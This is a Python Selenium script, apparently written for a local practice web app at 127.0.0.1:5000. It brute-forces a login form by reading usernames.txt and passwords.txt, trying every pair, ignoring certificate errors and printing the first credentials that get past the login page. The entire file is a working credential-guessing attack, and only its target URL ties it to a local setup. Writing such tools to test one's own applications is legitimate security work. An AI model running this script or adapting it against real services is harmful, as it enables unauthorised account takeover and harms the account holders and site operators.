from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By


#Chromedriver runterladen und den Pfad hier einfügen
s = Service(executable_path='chromedriver.exe')
options = webdriver.ChromeOptions()
options.add_argument('--ignore-certificate-errors')
driver = webdriver.Chrome(service=s, options=options)

website = "http://127.0.0.1:5000/login"

driver.get(website)

title = ""

usernames = []
passwords = []

with open ("usernames.txt", "r") as file:
    for line in file:
        usernames.append(line.strip())

with open ("passwords.txt", "r") as file:
    for line in file:
        passwords.append(line.strip())

i = 0

for password in passwords:
    for user in usernames:
        print("Testing this user", user)
        print("Testing this password", password)
        
        res = driver.find_elements(By.CLASS_NAME, "form-control")

        assert(len(res) == 2)

        res[0].clear()
        res[0].send_keys(user)

        res[1].clear()
        res[1].send_keys(password)

        but = driver.find_elements(By.CLASS_NAME, "btn-primary")
        assert(len(but) == 1)
        but[0].click()

        print(driver.title)

        if driver.title != "Login":
            print("User found", user)
            print("Password found", password)
            i = 1
            break
    if i == 1:
        break

driver.quit()